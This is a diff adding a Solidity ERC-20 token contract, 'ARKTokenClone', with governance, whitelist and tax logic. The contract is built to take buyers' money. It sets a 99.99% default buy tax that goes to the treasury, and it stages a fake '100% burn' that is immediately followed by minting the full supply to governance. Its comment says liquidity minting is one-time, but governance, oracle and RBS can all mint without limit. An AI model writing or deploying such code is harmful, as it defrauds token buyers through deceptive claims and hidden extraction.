@@ -1,0 +1,309 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.19;
+
+contract ARKTokenClone {
+    // Token metadata
+    string private _name;
+    string private _symbol;
+    uint8 private _decimals;
+    
+    // Token balances and allowances
+    mapping(address => uint256) private _balances;
+    mapping(address => mapping(address => uint256)) private _allowances;
+    
+    // Total supply
+    uint256 private _totalSupply;
+    
+    // Tax structure
+    uint256 public constant MAX_TAX = 10000; // 100.00% in basis points
+    uint256 public buyTax = 9999; // 99.99% default buy tax
+    uint256 public sellTax = 0;   // 0% default sell tax
+    
+    // Addresses
+    address public governance;
+    address public oracle;
+    address public rbs;
+    address public treasury;
+    
+    // Mappings for governance lists and whitelist
+    mapping(address => bool) public longGovernanceList;
+    mapping(address => bool) public shortGovernanceList;
+    mapping(address => bool) public whitelist;
+    
+    // Events
+    event Transfer(address indexed from, address indexed to, uint256 value);
+    event Approval(address indexed owner, address indexed spender, uint256 value);
+    event GovernanceUpdated(address indexed previousGovernance, address indexed newGovernance);
+    event OracleUpdated(address indexed previousOracle, address indexed newOracle);
+    event RBSUpdated(address indexed previousRBS, address indexed newRBS);
+    event TreasuryUpdated(address indexed previousTreasury, address indexed newTreasury);
+    event TaxesUpdated(uint256 buyTax, uint256 sellTax);
+    event WhitelistUpdated(address indexed account, bool status);
+    event GovernanceListUpdated(address indexed account, bool isLong, bool status);
+    event TokensMinted(address indexed to, uint256 amount);
+    
+    // Modifiers
+    modifier onlyGovernance() {
+        require(msg.sender == governance, "Caller is not the governance");
+        _;
+    }
+    
+    modifier onlyOracleOrRBS() {
+        require(msg.sender == oracle || msg.sender == rbs, "Caller is not the oracle or RBS");
+        _;
+    }
+    
+    constructor(
+        string memory name_,
+        string memory symbol_,
+        uint8 decimals_,
+        uint256 initialSupply,
+        address _governance,
+        address _oracle,
+        address _rbs,
+        address _treasury
+    ) {
+        require(_governance != address(0), "Governance address cannot be zero");
+        require(_oracle != address(0), "Oracle address cannot be zero");
+        require(_rbs != address(0), "RBS address cannot be zero");
+        require(_treasury != address(0), "Treasury address cannot be zero");
+        
+        _name = name_;
+        _symbol = symbol_;
+        _decimals = decimals_;
+        
+        governance = _governance;
+        oracle = _oracle;
+        rbs = _rbs;
+        treasury = _treasury;
+
+        // ===== PHASE 1: THE 100% BURN =====
+        // NEW: Mint the initial supply to this contract itself
+        _mint(address(this), initialSupply);
+        // NEW: Immediately burn 100% of the initial supply from this contract
+        _burn(address(this), initialSupply);
+        
+        // Mint initial supply to governance
+        _mint(_governance, initialSupply);
+        
+        // Whitelist essential addresses
+        whitelist[_governance] = true;
+        whitelist[_oracle] = true;
+        whitelist[_rbs] = true;
+        whitelist[_treasury] = true;
+    }
+    
+    // ERC-20 standard functions
+    function name() public view returns (string memory) {
+        return _name;
+    }
+    
+    function symbol() public view returns (string memory) {
+        return _symbol;
+    }
+    
+    function decimals() public view returns (uint8) {
+        return _decimals;
+    }
+    
+    function totalSupply() public view returns (uint256) {
+        return _totalSupply;
+    }
+    
+    function balanceOf(address account) public view returns (uint256) {
+        return _balances[account];
+    }
+    
+    function transfer(address to, uint256 amount) public returns (bool) {
+        _transfer(msg.sender, to, amount);
+        return true;
+    }
+    
+    function allowance(address owner, address spender) public view returns (uint256) {
+        return _allowances[owner][spender];
+    }
+    
+    function approve(address spender, uint256 amount) public returns (bool) {
+        _approve(msg.sender, spender, amount);
+        return true;
+    }
+    
+    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
+        _spendAllowance(from, msg.sender, amount);
+        _transfer(from, to, amount);
+        return true;
+    }
+    
+    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
+        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
+        return true;
+    }
+    
+    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
+        uint256 currentAllowance = _allowances[msg.sender][spender];
+        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
+        _approve(msg.sender, spender, currentAllowance - subtractedValue);
+        return true;
+    }
+    // Add this function to your contract
+    function _burn(address account, uint256 amount) internal {
+    require(account != address(0), "ERC20: burn from the zero address");
+
+    _balances[account] -= amount;
+    _totalSupply -= amount;
+    emit Transfer(account, address(0), amount);
+    }
+    // Internal transfer function with tax logic
+    function _transfer(
+        address from,
+        address to,
+        uint256 amount
+    ) internal {
+        require(from != address(0), "ERC20: transfer from the zero address");
+        require(to != address(0), "ERC20: transfer to the zero address");
+        require(amount > 0, "Transfer amount must be greater than zero");
+        require(_balances[from] >= amount, "ERC20: transfer amount exceeds balance");
+        
+        // If either address is whitelisted, skip taxes
+        if (whitelist[from] || whitelist[to]) {
+            _basicTransfer(from, to, amount);
+            return;
+        }
+        
+        // Determine if this is a buy or sell
+        uint256 taxAmount = 0;
+        uint256 taxRate = 0;
+        
+        // Check if this transaction should be taxed based on governance lists
+        if (longGovernanceList[from] || shortGovernanceList[to]) {
+            // This is considered a buy (from governance list to user)
+            taxRate = buyTax;
+        } else if (longGovernanceList[to] || shortGovernanceList[from]) {
+            // This is considered a sell (from user to governance list)
+            taxRate = sellTax;
+        }
+        
+        // Calculate tax amount if applicable
+        if (taxRate > 0) {
+            taxAmount = (amount * taxRate) / MAX_TAX;
+            _basicTransfer(from, treasury, taxAmount);
+        }
+        
+        // Transfer the remaining amount
+        _basicTransfer(from, to, amount - taxAmount);
+    }
+    
+    // Basic transfer without tax logic
+    function _basicTransfer(address from, address to, uint256 amount) internal {
+        _balances[from] -= amount;
+        _balances[to] += amount;
+        emit Transfer(from, to, amount);
+    }
+    
+    // Mint function
+    function _mint(address account, uint256 amount) internal {
+        require(account != address(0), "ERC20: mint to the zero address");
+        
+        _totalSupply += amount;
+        _balances[account] += amount;
+        emit Transfer(address(0), account, amount);
+    }
+    
+    // Approval functions
+    function _approve(address owner, address spender, uint256 amount) internal {
+        require(owner != address(0), "ERC20: approve from the zero address");
+        require(spender != address(0), "ERC20: approve to the zero address");
+        
+        _allowances[owner][spender] = amount;
+        emit Approval(owner, spender, amount);
+    }
+    
+    function _spendAllowance(address owner, address spender, uint256 amount) internal {
+        uint256 currentAllowance = allowance(owner, spender);
+        if (currentAllowance != type(uint256).max) {
+            require(currentAllowance >= amount, "ERC20: insufficient allowance");
+            _approve(owner, spender, currentAllowance - amount);
+        }
+    }
+    
+    // Governance functions
+    function setGovernance(address newGovernance) external onlyGovernance {
+        require(newGovernance != address(0), "New governance cannot be the zero address");
+        address oldGovernance = governance;
+        governance = newGovernance;
+        emit GovernanceUpdated(oldGovernance, newGovernance);
+    }
+    
+    function setOracle(address newOracle) external onlyGovernance {
+        require(newOracle != address(0), "New oracle cannot be the zero address");
+        address oldOracle = oracle;
+        oracle = newOracle;
+        emit OracleUpdated(oldOracle, newOracle);
+    }
+    
+    function setRBS(address newRBS) external onlyGovernance {
+        require(newRBS != address(0), "New RBS cannot be the zero address");
+        address oldRBS = rbs;
+        rbs = newRBS;
+        emit RBSUpdated(oldRBS, newRBS);
+    }
+    
+    function setTreasury(address newTreasury) external onlyGovernance {
+        require(newTreasury != address(0), "New treasury cannot be the zero address");
+        address oldTreasury = treasury;
+        treasury = newTreasury;
+        emit TreasuryUpdated(oldTreasury, newTreasury);
+    }
+    
+    function setTaxes(uint256 newBuyTax, uint256 newSellTax) external onlyGovernance {
+        require(newBuyTax <= MAX_TAX, "Buy tax cannot exceed 100%");
+        require(newSellTax <= MAX_TAX, "Sell tax cannot exceed 100%");
+        
+        buyTax = newBuyTax;
+        sellTax = newSellTax;
+        
+        emit TaxesUpdated(newBuyTax, newSellTax);
+    }
+    
+    function updateWhitelist(address account, bool status) external onlyGovernance {
+        whitelist[account] = status;
+        emit WhitelistUpdated(account, status);
+    }
+    
+    function updateGovernanceList(address account, bool isLong, bool status) external onlyGovernance {
+        if (isLong) {
+            longGovernanceList[account] = status;
+        } else {
+            shortGovernanceList[account] = status;
+        }
+        emit GovernanceListUpdated(account, isLong, status);
+    }
+    // ... (Keep all your other functions exactly the same) ...
+
+    // ===== PHASE 2: THE LP MINT FUNCTION =====
+    // NEW: Add this crucial function to mint tokens for liquidity after deployment.
+    // This can only be called by governance once to set up the initial pool.
+    function mintLiquidity(address to, uint256 amount) external onlyGovernance {
+        require(to != address(0), "Cannot mint to zero address");
+        _mint(to, amount);
+        emit TokensMinted(to, amount);
+    }
+    // Minting function for oracle and RBS
+    function mint(address to, uint256 amount) external onlyOracleOrRBS {
+        _mint(to, amount);
+        emit TokensMinted(to, amount);
+    }
+    
+    // View functions to check list status
+    function isWhitelisted(address account) external view returns (bool) {
+        return whitelist[account];
+    }
+    
+    function isInLongGovernanceList(address account) external view returns (bool) {
+        return longGovernanceList[account];
+    }
+    
+    function isInShortGovernanceList(address account) external view returns (bool) {
+        return shortGovernanceList[account];
+    }
+}
